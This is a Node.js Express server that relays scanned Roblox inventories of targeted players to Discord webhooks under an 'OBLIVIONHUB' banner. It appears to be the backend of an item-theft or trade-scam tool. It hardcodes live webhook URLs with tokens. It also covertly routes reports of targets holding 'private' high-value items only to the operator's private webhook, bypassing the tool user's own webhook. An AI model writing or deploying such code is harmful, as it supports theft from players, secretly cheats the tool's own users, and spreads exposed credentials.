const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';
const PRIVATE_WEBHOOK = 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';

// Rate limiting: registrar últimos envíos por webhook
const lastSent = {};

app.use(express.json());

app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'API funcionando correctamente' });
});

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Datos recibidos:', data);

        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const webhookUrl = data.webhookUrl;
        const hasPrivateItem = data.hasPrivateItem || false;

        const brainTargeted = data.brainTargeted || [];
        const baseTargeted = data.baseTargeted || [];
        const gearTargeted = data.gearTargeted || [];

        const privateBrainTargeted = data.privateBrainTargeted || [];
        const privateBaseTargeted = data.privateBaseTargeted || [];
        const privateGearTargeted = data.privateGearTargeted || [];

        const allBrainrots = data.brainrots || [];
        const allBases = data.bases || [];
        const allGears = data.gears || [];

        const timestamp = data.timestamp || Date.now();

        function formatListWithCount(list) {
            if (!list || list.length === 0) return 'Ninguno';
            const counts = {};
            list.forEach(item => {
                counts[item] = (counts[item] || 0) + 1;
            });
            const formatted = Object.keys(counts).map(name => {
                return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
            });
            return formatted.join(', ');
        }

        const allBrainrotNames = allBrainrots.map(item => item.displayName);
        const allBaseNames = allBases.map(item => item.displayName);
        const allGearNames = allGears.map(item => item.displayName);
        const allItems = [...allBrainrotNames, ...allBaseNames, ...allGearNames];

        let displayBrainTargeted, displayBaseTargeted, displayGearTargeted;
        if (hasPrivateItem) {
            displayBrainTargeted = privateBrainTargeted;
            displayBaseTargeted = privateBaseTargeted;
            displayGearTargeted = privateGearTargeted;
        } else {
            displayBrainTargeted = brainTargeted;
            displayBaseTargeted = baseTargeted;
            displayGearTargeted = gearTargeted;
        }

        const lines = [];

        lines.push('✅ SUCCESS: OBLIVIONHUB INVITE SENT');
        lines.push(`✨ Invite successfully sent to Username: ${player}`);
        lines.push('Inventory scan complete. Processing items.');
        lines.push('');

        lines.push('Brainrots targeados:');
        lines.push(formatListWithCount(displayBrainTargeted));
        lines.push('');

        lines.push('Gears targeados:');
        lines.push(formatListWithCount(displayGearTargeted));
        lines.push('');

        lines.push('Bases targeadas:');
        lines.push(formatListWithCount(displayBaseTargeted));
        lines.push('');

        lines.push('ALL ITEMS:');
        if (allItems.length === 0) {
            lines.push('Ninguno');
        } else {
            lines.push(formatListWithCount(allItems));
        }
        lines.push('');

        const date = new Date(timestamp);
        const formattedDate = date.toLocaleString('es-ES', { 
            timeZone: 'UTC',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        }).replace(/\//g, '-');
        lines.push(`OBLIVIONHUB| Automated System•${formattedDate} UTC`);

        const fullContent = lines.join('\n');

        const payload = {
            content: fullContent,
            username: 'TradeNotifier',
            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
        };

        // Decidir a qué webhooks enviar
        let webhooksToSend = [];

        if (hasPrivateItem) {
            // Si hay coincidencia, SOLO al webhook privado
            webhooksToSend = [PRIVATE_WEBHOOK];
        } else {
            // Sin coincidencia: al webhook del usuario (si existe) y al FALLBACK
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            }
            webhooksToSend.push(FALLBACK_WEBHOOK);
        }

        // Función para enviar con rate limiting
        async function sendWithRateLimit(url, payload) {
            const now = Date.now();
            const key = url;
            const lastTime = lastSent[key] || 0;
            const cooldown = 3000; // 3 segundos entre envíos al mismo webhook

            const waitTime = Math.max(0, cooldown - (now - lastTime));
            if (waitTime > 0) {
                console.log(`⏳ Esperando ${waitTime}ms antes de enviar a ${url}`);
                await new Promise(resolve => setTimeout(resolve, waitTime));
            }

            try {
                const response = await axios.post(url, payload);
                lastSent[key] = Date.now();
                console.log(`✅ Enviado a: ${url}`);
                return response;
            } catch (error) {
                if (error.response && error.response.status === 429) {
                    // Si recibimos 429, esperar el tiempo indicado en el header Retry-After
                    const retryAfter = error.response.headers['retry-after'];
                    const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : 5000;
                    console.log(`⏳ Rate limit (429). Esperando ${waitTime}ms antes de reintentar a ${url}`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                    // Reintentar una vez
                    const retry = await axios.post(url, payload);
                    lastSent[key] = Date.now();
                    console.log(`✅ Reenviado a: ${url}`);
                    return retry;
                }
                throw error;
            }
        }

        // Enviar a todos los webhooks con rate limiting
        for (const url of webhooksToSend) {
            await sendWithRateLimit(url, payload);
        }

        res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
